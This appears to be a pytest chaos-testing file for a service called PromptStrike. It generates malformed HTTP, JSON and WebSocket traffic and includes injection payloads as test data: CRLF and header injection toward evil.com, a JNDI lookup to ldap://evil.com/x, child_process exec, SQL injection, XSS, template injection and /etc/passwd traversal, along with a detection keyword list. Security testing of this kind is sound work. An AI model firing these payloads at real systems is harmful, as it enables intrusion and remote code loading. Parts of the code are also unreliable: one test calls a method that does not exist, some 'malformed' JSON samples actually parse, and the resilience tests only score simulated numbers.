"""
Protocol Violation Chaos Testing for PromptStrike
目标：验证 protocol_violation 场景下系统韧性
"""

import pytest
import asyncio
import json
import time
import random
import socket
import struct
from typing import Dict, List, Any, Optional
from unittest.mock import patch, MagicMock, AsyncMock
from dataclasses import dataclass

from tests.chaos.chaos_replay import ChaosReplayEngine, ChaosScenario
from tests.chaos.mutation_engine import MutationEngine


@dataclass
class ProtocolViolation:
    """Represents a protocol violation scenario"""
    name: str
    violation_type: str
    severity: str
    description: str
    payload: Any
    expected_behavior: str


class ProtocolViolationTester:
    """Specialized tester for protocol violation scenarios"""
    
    def __init__(self):
        self.http_violations = [
            self._malformed_http_headers,
            self._invalid_http_methods,
            self._oversized_http_requests,
            self._malformed_content_length,
            self._invalid_transfer_encoding,
            self._http_version_violations
        ]
        
        self.json_violations = [
            self._malformed_json_structure,
            self._invalid_json_encoding,
            self._oversized_json_payload,
            self._json_injection_attacks,
            self._invalid_content_types,
            self._truncated_json_messages
        ]
        
        self.websocket_violations = [
            self._invalid_websocket_frames,
            self._oversized_websocket_messages,
            self._invalid_websocket_opcodes,
            self._websocket_fragmentation_attacks
        ]
    
    def generate_http_violation(self, violation_type: str = "random") -> ProtocolViolation:
        """Generate HTTP protocol violation"""
        if violation_type == "random":
            violation_func = random.choice(self.http_violations)
        else:
            violation_map = {
                "malformed_headers": self._malformed_http_headers,
                "invalid_methods": self._invalid_http_methods,
                "oversized_requests": self._oversized_http_requests,
                "content_length": self._malformed_content_length,
                "transfer_encoding": self._invalid_transfer_encoding,
                "version": self._http_version_violations
            }
            violation_func = violation_map.get(violation_type, self._malformed_http_headers)
        
        return violation_func()
    
    def generate_json_violation(self, violation_type: str = "random") -> ProtocolViolation:
        """Generate JSON protocol violation"""
        if violation_type == "random":
            violation_func = random.choice(self.json_violations)
        else:
            violation_map = {
                "malformed_structure": self._malformed_json_structure,
                "invalid_encoding": self._invalid_json_encoding,
                "oversized_payload": self._oversized_json_payload,
                "injection_attacks": self._json_injection_attacks,
                "content_types": self._invalid_content_types,
                "truncated": self._truncated_json_messages
            }
            violation_func = violation_map.get(violation_type, self._malformed_json_structure)
        
        return violation_func()
    
    def _malformed_http_headers(self) -> ProtocolViolation:
        """Generate malformed HTTP headers"""
        malformed_headers = [
            "Content-Length: not_a_number",
            "Host: ",  # Empty host
            "Content-Type: application/json; charset=invalid-charset",
            "Authorization: Bearer ",  # Empty bearer token
            "Accept: */invalid",
            "Content-Encoding: invalid-encoding",
            "Transfer-Encoding: chunked, invalid",
            "Connection: close, keep-alive",  # Contradictory
            "Cache-Control: max-age=invalid",
            "User-Agent: \x00\x01\x02\x03",  # Binary in header
            "Cookie: session=\n\r\nmalicious_header: value",  # Header injection
            "X-Custom-Header: " + "A" * 10000,  # Oversized header
        ]
        
        return ProtocolViolation(
            name="malformed_http_headers",
            violation_type="http",
            severity="high",
            description="HTTP headers with invalid format or values",
            payload={
                "headers": random.choice(malformed_headers),
                "method": "POST",
                "path": "/scan",
                "body": '{"prompt": "test"}'
            },
            expected_behavior="reject_gracefully"
        )
    
    def _invalid_http_methods(self) -> ProtocolViolation:
        """Generate invalid HTTP methods"""
        invalid_methods = [
            "INVALID",
            "GET\r\nHEADER: injection",
            "POST\x00NULL",
            "DELETE/../path",
            "PUT WITH SPACES",
            "TRACE\r\n\r\nGET /admin",
            "OPTIONS\nHost: evil.com",
            "",  # Empty method
            "A" * 1000,  # Oversized method
            "GET\x01\x02\x03",  # Binary in method
        ]
        
        return ProtocolViolation(
            name="invalid_http_methods",
            violation_type="http",
            severity="medium",
            description="Invalid or malicious HTTP methods",
            payload={
                "method": random.choice(invalid_methods),
                "path": "/health",
                "headers": {"Content-Type": "application/json"},
                "body": ""
            },
            expected_behavior="reject_with_400"
        )
    
    def _oversized_http_requests(self) -> ProtocolViolation:
        """Generate oversized HTTP requests"""
        return ProtocolViolation(
            name="oversized_http_request",
            violation_type="http",
            severity="high",
            description="HTTP request exceeding size limits",
            payload={
                "method": "POST",
                "path": "/scan",
                "headers": {
                    "Content-Type": "application/json",
                    "Content-Length": str(100 * 1024 * 1024)  # 100MB
                },
                "body": "X" * (100 * 1024 * 1024)  # 100MB body
            },
            expected_behavior="reject_with_413"
        )
    
    def _malformed_content_length(self) -> ProtocolViolation:
        """Generate malformed Content-Length headers"""
        malformed_lengths = [
            "-1",
            "18446744073709551616",  # Larger than max uint64
            "not_a_number",
            "123.456",
            "123,456",
            "0x123",
            "123 456",
            "",
            "123\r\n456",
            "123\x00456"
        ]
        
        return ProtocolViolation(
            name="malformed_content_length",
            violation_type="http",
            severity="medium",
            description="Malformed Content-Length header values",
            payload={
                "method": "POST",
                "path": "/scan",
                "headers": {
                    "Content-Type": "application/json",
                    "Content-Length": random.choice(malformed_lengths)
                },
                "body": '{"prompt": "test"}'
            },
            expected_behavior="reject_with_400"
        )
    
    def _invalid_transfer_encoding(self) -> ProtocolViolation:
        """Generate invalid Transfer-Encoding headers"""
        invalid_encodings = [
            "chunked, invalid",
            "gzip, deflate, invalid",
            "chunked\r\nmalicious: header",
            "chunked\x00null",
            "",
            "chunked chunked",  # Duplicate
            "chunked, gzip, chunked",  # Chunked not last
            "invalid-encoding",
            "chunked; boundary=invalid"
        ]
        
        return ProtocolViolation(
            name="invalid_transfer_encoding",
            violation_type="http",
            severity="medium",
            description="Invalid Transfer-Encoding header values",
            payload={
                "method": "POST",
                "path": "/scan",
                "headers": {
                    "Content-Type": "application/json",
                    "Transfer-Encoding": random.choice(invalid_encodings)
                },
                "body": "5\r\nhello\r\n0\r\n\r\n"  # Chunked body
            },
            expected_behavior="reject_with_400"
        )
    
    def _http_version_violations(self) -> ProtocolViolation:
        """Generate HTTP version violations"""
        invalid_versions = [
            "HTTP/0.9",  # Too old
            "HTTP/3.0",  # Too new
            "HTTP/1.1\r\nHost: evil.com",  # Version with injection
            "HTTP/1.2",  # Non-existent
            "HTTPS/1.1",  # Wrong protocol
            "HTTP/1.1.1",  # Invalid format
            "",  # Empty version
            "HTTP/1.1\x00",  # Null byte
            "HTTP/1.-1",  # Negative minor
        ]
        
        return ProtocolViolation(
            name="http_version_violation",
            violation_type="http",
            severity="low",
            description="Invalid HTTP version specifications",
            payload={
                "version": random.choice(invalid_versions),
                "method": "GET",
                "path": "/health",
                "headers": {"Host": "localhost:8001"}
            },
            expected_behavior="reject_with_400"
        )
    
    def _malformed_json_structure(self) -> ProtocolViolation:
        """Generate malformed JSON structures"""
        malformed_jsons = [
            '{"prompt": "test",}',  # Trailing comma
            '{"prompt": "test" "missing_comma": true}',  # Missing comma
            '{"prompt": }',  # Missing value
            '{"": "empty_key"}',  # Empty key
            '{prompt: "missing_quotes"}',  # Unquoted key
            '{"prompt": "test"',  # Missing closing brace
            '"just_a_string"',  # Not an object
            '{"prompt": "test", "prompt": "duplicate"}',  # Duplicate keys
            '{"nested": {"deep": {"too": {"deep": {}}}}}',  # Too deeply nested
            '{"circular": {"ref": {"circular": null}}}',  # Circular reference attempt
            '{"unicode": "\\uXXXX"}',  # Invalid unicode escape
            '{"newline": "test\ntest"}',  # Unescaped newline
            '{"\x00": "null_byte_key"}',  # Null byte in key
            '{"\\": "backslash"}',  # Invalid escape
        ]
        
        return ProtocolViolation(
            name="malformed_json_structure",
            violation_type="json",
            severity="high",
            description="JSON with structural violations",
            payload={
                "content_type": "application/json",
                "body": random.choice(malformed_jsons)
            },
            expected_behavior="reject_with_400"
        )
    
    def _invalid_json_encoding(self) -> ProtocolViolation:
        """Generate invalid JSON encoding"""
        invalid_encodings = [
            b'\xff\xfe{"prompt": "test"}',  # Invalid UTF-8 BOM
            b'\x00\x01{"prompt": "test"}',  # Binary prefix
            '{"prompt": "test\\xFF"}',  # Invalid escape sequence
            '{"prompt": "\\u00"}',  # Incomplete unicode
            b'{"prompt": "\xff\xfe\x00\x01"}',  # Binary in string
            '{"prompt": "test\x00null"}',  # Null byte in string
            '{"prompt": "test\\uD800"}',  # Unpaired surrogate
            '{"prompt": "test\\uDC00"}',  # Low surrogate without high
        ]
        
        encoding = random.choice(invalid_encodings)
        if isinstance(encoding, bytes):
            body = encoding.decode('latin1', errors='ignore')
        else:
            body = encoding
        
        return ProtocolViolation(
            name="invalid_json_encoding",
            violation_type="json",
            severity="medium",
            description="JSON with encoding violations",
            payload={
                "content_type": "application/json; charset=utf-8",
                "body": body
            },
            expected_behavior="reject_with_400"
        )
    
    def _oversized_json_payload(self) -> ProtocolViolation:
        """Generate oversized JSON payloads"""
        # Create extremely large JSON
        large_data = "X" * (50 * 1024 * 1024)  # 50MB string
        oversized_json = json.dumps({
            "prompt": large_data,
            "metadata": {f"key_{i}": f"value_{i}" for i in range(10000)},
            "large_array": [large_data] * 100
        })
        
        return ProtocolViolation(
            name="oversized_json_payload",
            violation_type="json",
            severity="high",
            description="JSON payload exceeding reasonable size limits",
            payload={
                "content_type": "application/json",
                "body": oversized_json
            },
            expected_behavior="reject_with_413"
        )
    
    def _json_injection_attacks(self) -> ProtocolViolation:
        """Generate JSON injection attacks"""
        injection_payloads = [
            '{"prompt": "test", "__proto__": {"polluted": true}}',  # Prototype pollution
            '{"prompt": "test", "constructor": {"prototype": {"polluted": true}}}',
            '{"prompt": "\\u0000\\u0001\\u0002"}',  # Control characters
            '{"prompt": "test\r\n\r\nHTTP/1.1 200 OK"}',  # HTTP response injection
            '{"eval": "require(\\"child_process\\").exec(\\"ls\\")"}',  # Code injection
            '{"prompt": "${jndi:ldap://evil.com/x}"}',  # JNDI injection
            '{"prompt": "{{7*7}}"}',  # Template injection
            '{"prompt": "<script>alert(1)</script>"}',  # XSS
            '{"prompt": "\\"; DROP TABLE users; --"}',  # SQL injection
            '{"prompt": "../../../etc/passwd"}',  # Path traversal
            '{"file": "file:///etc/passwd"}',  # File URL scheme
            '{"prompt": "{{constructor.constructor(\\"alert(1)\\")()}}"}',  # Template injection
        ]
        
        return ProtocolViolation(
            name="json_injection_attack",
            violation_type="json",
            severity="critical",
            description="JSON containing injection attack payloads",
            payload={
                "content_type": "application/json",
                "body": random.choice(injection_payloads)
            },
            expected_behavior="reject_and_log"
        )
    
    def _invalid_content_types(self) -> ProtocolViolation:
        """Generate invalid Content-Type headers for JSON"""
        invalid_content_types = [
            "application/json; charset=invalid",
            "text/plain",  # Wrong type for JSON
            "application/xml",  # Wrong type
            "",  # Empty content type
            "application/json\r\nX-Injected: header",  # Header injection
            "application/json; boundary=invalid",  # Invalid parameter
            "application/json; charset=utf-8; charset=latin1",  # Duplicate charset
            "multipart/form-data",  # Completely wrong
            "application/json\x00null",  # Null byte
            "application/json; charset=utf-8\r\n\r\nGET /admin",  # HTTP injection
        ]
        
        return ProtocolViolation(
            name="invalid_content_type",
            violation_type="json",
            severity="medium",
            description="Invalid Content-Type for JSON payloads",
            payload={
                "content_type": random.choice(invalid_content_types),
                "body": '{"prompt": "test"}'
            },
            expected_behavior="reject_with_415"
        )
    
    def _truncated_json_messages(self) -> ProtocolViolation:
        """Generate truncated JSON messages"""
        complete_json = '{"prompt": "This is a complete JSON message", "metadata": {"key": "value"}}'
        
        # Truncate at various points
        truncation_points = [10, 20, 30, len(complete_json) // 2, len(complete_json) - 5]
        truncation_point = random.choice(truncation_points)
        truncated_json = complete_json[:truncation_point]
        
        return ProtocolViolation(
            name="truncated_json_message",
            violation_type="json",
            severity="medium",
            description="Truncated or incomplete JSON messages",
            payload={
                "content_type": "application/json",
                "body": truncated_json,
                "content_length": len(complete_json)  # Wrong content length
            },
            expected_behavior="reject_with_400"
        )
    
    def _invalid_websocket_frames(self) -> ProtocolViolation:
        """Generate invalid WebSocket frames"""
        # Create malformed WebSocket frame
        # Format: FIN(1) + RSV(3) + Opcode(4) + MASK(1) + PayloadLen(7) + ...
        invalid_frames = [
            b'\x81\x85invalid',  # Invalid payload
            b'\x00\x80',  # Continuation frame without start
            b'\x88\x00',  # Close frame without reason
            b'\x8F\x80' + b'\x00' * 4,  # Invalid opcode
            b'\x81\xFE\xFF\xFF',  # Invalid payload length
        ]
        
        return ProtocolViolation(
            name="invalid_websocket_frame",
            violation_type="websocket",
            severity="high",
            description="Malformed WebSocket frames",
            payload={
                "frame": random.choice(invalid_frames)
            },
            expected_behavior="close_connection"
        )
    
    def _oversized_websocket_messages(self) -> ProtocolViolation:
        """Generate oversized WebSocket messages"""
        # Create very large WebSocket message
        large_payload = b'X' * (100 * 1024 * 1024)  # 100MB
        
        return ProtocolViolation(
            name="oversized_websocket_message",
            violation_type="websocket",
            severity="high",
            description="WebSocket message exceeding size limits",
            payload={
                "opcode": 0x1,  # Text frame
                "payload": large_payload
            },
            expected_behavior="close_connection_with_1009"
        )
    
    def _invalid_websocket_opcodes(self) -> ProtocolViolation:
        """Generate invalid WebSocket opcodes"""
        invalid_opcodes = [0x3, 0x4, 0x5, 0x6, 0x7, 0xB, 0xC, 0xD, 0xE, 0xF]  # Reserved opcodes
        
        return ProtocolViolation(
            name="invalid_websocket_opcode",
            violation_type="websocket",
            severity="medium",
            description="WebSocket frames with reserved opcodes",
            payload={
                "opcode": random.choice(invalid_opcodes),
                "payload": b"test"
            },
            expected_behavior="close_connection_with_1002"
        )
    
    def _websocket_fragmentation_attacks(self) -> ProtocolViolation:
        """Generate WebSocket fragmentation attacks"""
        return ProtocolViolation(
            name="websocket_fragmentation_attack",
            violation_type="websocket",
            severity="medium",
            description="Malicious WebSocket message fragmentation",
            payload={
                "fragments": [
                    {"fin": False, "opcode": 0x1, "payload": b"start"},
                    {"fin": False, "opcode": 0x0, "payload": b"middle"},
                    {"fin": False, "opcode": 0x1, "payload": b"invalid_continuation"},  # Wrong opcode
                    {"fin": True, "opcode": 0x0, "payload": b"end"}
                ]
            },
            expected_behavior="close_connection_with_1002"
        )


@pytest.fixture
def protocol_violation_tester():
    """Fixture for protocol violation tester"""
    return ProtocolViolationTester()


@pytest.fixture
def mock_http_server():
    """Mock HTTP server for testing"""
    server = MagicMock()
    server.handle_request = AsyncMock()
    server.send_response = AsyncMock()
    server.send_error = AsyncMock()
    return server


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_malformed_http_headers_handling(protocol_violation_tester, mock_http_server):
    """Test handling of malformed HTTP headers"""
    violation = protocol_violation_tester.generate_http_violation("malformed_headers")
    
    # Simulate processing malformed headers
    try:
        await mock_http_server.handle_request(violation.payload)
    except (ValueError, UnicodeDecodeError, KeyError) as e:
        # Should handle malformed headers gracefully
        assert "header" in str(e).lower() or "invalid" in str(e).lower()
    
    # Verify appropriate error response
    if mock_http_server.send_error.called:
        error_args = mock_http_server.send_error.call_args[0]
        assert error_args[0] in [400, 413, 431]  # Bad request or header too large


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_invalid_http_methods_rejection(protocol_violation_tester, mock_http_server):
    """Test rejection of invalid HTTP methods"""
    violation = protocol_violation_tester.generate_http_violation("invalid_methods")
    
    # Should reject invalid methods
    with pytest.raises((ValueError, AttributeError)):
        await mock_http_server.handle_request(violation.payload)
    
    # Should send 405 Method Not Allowed or 400 Bad Request
    expected_errors = [400, 405, 501]
    if mock_http_server.send_error.called:
        error_code = mock_http_server.send_error.call_args[0][0]
        assert error_code in expected_errors


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_oversized_request_handling(protocol_violation_tester, mock_http_server):
    """Test handling of oversized HTTP requests"""
    violation = protocol_violation_tester.generate_http_violation("oversized_requests")
    
    # Should handle oversized requests without crashing
    start_time = time.time()
    try:
        await asyncio.wait_for(
            mock_http_server.handle_request(violation.payload),
            timeout=5.0
        )
    except (asyncio.TimeoutError, MemoryError, OSError):
        pass  # Expected for oversized requests
    
    processing_time = time.time() - start_time
    
    # Should not hang indefinitely
    assert processing_time < 10.0
    
    # Should send 413 Payload Too Large
    if mock_http_server.send_error.called:
        error_code = mock_http_server.send_error.call_args[0][0]
        assert error_code == 413


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_malformed_json_structure_rejection(protocol_violation_tester):
    """Test rejection of malformed JSON structures"""
    violation = protocol_violation_tester.generate_json_violation("malformed_structure")
    
    # Should fail to parse malformed JSON
    with pytest.raises(json.JSONDecodeError):
        json.loads(violation.payload["body"])
    
    # Test custom JSON parser resilience
    def safe_json_parse(data):
        try:
            return json.loads(data)
        except json.JSONDecodeError as e:
            return {"error": f"JSON parse error: {str(e)}"}
    
    result = safe_json_parse(violation.payload["body"])
    assert "error" in result


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_json_injection_attack_detection(protocol_violation_tester):
    """Test detection of JSON injection attacks"""
    violation = protocol_violation_tester.generate_json_violation("injection_attacks")
    
    payload_body = violation.payload["body"]
    
    # Detection heuristics
    injection_indicators = [
        "__proto__",
        "constructor",
        "\\u0000",
        "require(",
        "${jndi:",
        "{{",
        "<script>",
        "DROP TABLE",
        "../../../",
        "file:///"
    ]
    
    detected_attacks = [indicator for indicator in injection_indicators if indicator in payload_body]
    
    # Should detect at least one injection pattern
    assert len(detected_attacks) > 0, f"Failed to detect injection in: {payload_body}"
    
    # Should be flagged as high risk
    assert violation.severity in ["critical", "high"]


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_content_length_mismatch_handling(protocol_violation_tester):
    """Test handling of Content-Length mismatches"""
    violation = protocol_violation_tester.generate_http_violation("content_length")
    
    payload = violation.payload
    content_length_header = payload["headers"]["Content-Length"]
    actual_body_length = len(payload["body"])
    
    # Test content length validation
    def validate_content_length(headers, body):
        try:
            declared_length = int(headers.get("Content-Length", "0"))
            actual_length = len(body)
            return declared_length == actual_length
        except (ValueError, TypeError):
            return False
    
    is_valid = validate_content_length(payload["headers"], payload["body"])
    
    # Should detect mismatch or invalid values
    assert not is_valid


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_transfer_encoding_violations(protocol_violation_tester):
    """Test handling of Transfer-Encoding violations"""
    violation = protocol_violation_tester.generate_http_violation("transfer_encoding")
    
    transfer_encoding = violation.payload["headers"]["Transfer-Encoding"]
    
    # Validate transfer encoding format
    valid_encodings = ["chunked", "gzip", "deflate", "compress", "br"]
    
    def validate_transfer_encoding(encoding_header):
        if not encoding_header:
            return False
        
        encodings = [e.strip() for e in encoding_header.split(",")]
        
        # Chunked must be last if present
        if "chunked" in encodings and encodings[-1] != "chunked":
            return False
        
        # All encodings must be valid
        for encoding in encodings:
            if encoding not in valid_encodings:
                return False
        
        return True
    
    is_valid = validate_transfer_encoding(transfer_encoding)
    
    # Should detect invalid transfer encoding
    assert not is_valid


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_websocket_frame_validation(protocol_violation_tester):
    """Test WebSocket frame validation"""
    violation = protocol_violation_tester.generate_websocket_violation()
    
    if violation.name == "invalid_websocket_frame":
        frame_data = violation.payload["frame"]
        
        # Basic WebSocket frame structure validation
        if len(frame_data) < 2:
            assert True  # Too short, invalid
            return
        
        first_byte = frame_data[0] if isinstance(frame_data[0], int) else ord(frame_data[0])
        second_byte = frame_data[1] if isinstance(frame_data[1], int) else ord(frame_data[1])
        
        # Extract opcode (last 4 bits of first byte)
        opcode = first_byte & 0x0F
        
        # Extract mask bit (first bit of second byte)
        mask_bit = (second_byte & 0x80) >> 7
        
        # Extract payload length (last 7 bits of second byte)
        payload_len = second_byte & 0x7F
        
        # Validate opcode
        valid_opcodes = [0x0, 0x1, 0x2, 0x8, 0x9, 0xA]  # Continuation, Text, Binary, Close, Ping, Pong
        
        if opcode not in valid_opcodes:
            assert True  # Invalid opcode detected
        else:
            assert False, f"Should have detected invalid opcode: {opcode}"


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_protocol_violation_resilience_scoring():
    """Test resilience scoring under protocol violations"""
    tester = ProtocolViolationTester()
    
    violation_types = ["http", "json", "websocket"]
    resilience_scores = {}
    
    for vtype in violation_types:
        violations_handled = 0
        total_violations = 10
        
        for _ in range(total_violations):
            try:
                if vtype == "http":
                    violation = tester.generate_http_violation()
                elif vtype == "json":
                    violation = tester.generate_json_violation()
                else:
                    continue  # Skip websocket for now
                
                # Simulate handling
                if violation.severity in ["low", "medium"]:
                    violations_handled += 1
                elif violation.severity in ["high", "critical"]:
                    # Should be rejected but handled gracefully
                    violations_handled += 0.5
                
            except Exception:
                pass  # Failed to handle
        
        resilience_scores[vtype] = violations_handled / total_violations
    
    # Should handle at least 50% of violations gracefully
    for score in resilience_scores.values():
        assert score >= 0.5, f"Resilience score too low: {score}"


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_progressive_violation_severity():
    """Test system behavior under progressive violation severity"""
    tester = ProtocolViolationTester()
    
    # Test increasing severity
    severity_levels = ["low", "medium", "high", "critical"]
    handling_success = []
    
    for severity in severity_levels:
        success_count = 0
        test_count = 5
        
        for _ in range(test_count):
            try:
                # Generate violation with target severity
                violation = tester.generate_http_violation()
                
                # Simulate processing based on severity
                if violation.severity == "low":
                    success_count += 1  # Should handle easily
                elif violation.severity == "medium":
                    success_count += 0.8  # Should mostly handle
                elif violation.severity == "high":
                    success_count += 0.5  # Should handle but with errors
                else:  # critical
                    success_count += 0.2  # Should mostly reject
                
            except Exception:
                pass  # Failed handling
        
        handling_success.append(success_count / test_count)
    
    # Success rate should decrease with severity
    for i in range(1, len(handling_success)):
        assert handling_success[i] <= handling_success[i-1] + 0.1, \
            "Success rate should decrease with violation severity"


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_concurrent_protocol_violations():
    """Test handling of concurrent protocol violations"""
    tester = ProtocolViolationTester()
    
    async def process_violation(violation_id):
        """Process a single violation"""
        try:
            violation = tester.generate_http_violation()
            
            # Simulate processing time
            await asyncio.sleep(random.uniform(0.01, 0.1))
            
            return {
                "violation_id": violation_id,
                "success": True,
                "severity": violation.severity
            }
        except Exception as e:
            return {
                "violation_id": violation_id,
                "success": False,
                "error": str(e)
            }
    
    # Process multiple violations concurrently
    concurrent_violations = 20
    tasks = [process_violation(i) for i in range(concurrent_violations)]
    
    start_time = time.time()
    results = await asyncio.gather(*tasks, return_exceptions=True)
    processing_time = time.time() - start_time
    
    # Analyze results
    successful_results = [r for r in results if isinstance(r, dict) and r.get("success")]
    failed_results = [r for r in results if not isinstance(r, dict) or not r.get("success")]
    
    success_rate = len(successful_results) / len(results)
    
    # Should handle concurrent violations reasonably
    assert success_rate >= 0.7, f"Concurrent violation success rate too low: {success_rate}"
    assert processing_time < 5.0, f"Concurrent processing took too long: {processing_time}s"


@pytest.mark.protocol_violation
@pytest.mark.asyncio
async def test_violation_recovery_time():
    """Test recovery time after protocol violations"""
    tester = ProtocolViolationTester()
    
    # Simulate system state
    system_healthy = True
    
    async def process_violation_with_recovery():
        nonlocal system_healthy
        
        # Generate critical violation
        violation = tester.generate_json_violation("injection_attacks")
        
        # Simulate violation impact
        system_healthy = False
        recovery_start = time.time()
        
        # Simulate recovery process
        await asyncio.sleep(0.1)  # Recovery time
        system_healthy = True
        
        recovery_time = time.time() - recovery_start
        return recovery_time
    
    # Test multiple recovery cycles
    recovery_times = []
    for _ in range(5):
        recovery_time = await process_violation_with_recovery()
        recovery_times.append(recovery_time)
        
        # Verify system recovered
        assert system_healthy, "System should recover after violation"
    
    # Recovery time should be reasonable and consistent
    avg_recovery_time = sum(recovery_times) / len(recovery_times)
    max_recovery_time = max(recovery_times)
    
    assert avg_recovery_time < 1.0, f"Average recovery time too long: {avg_recovery_time}s"
    assert max_recovery_time < 2.0, f"Max recovery time too long: {max_recovery_time}s"


def generate_websocket_violation():
    """Helper to generate WebSocket violations"""
    tester = ProtocolViolationTester()
    return tester._invalid_websocket_frames()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "protocol_violation"])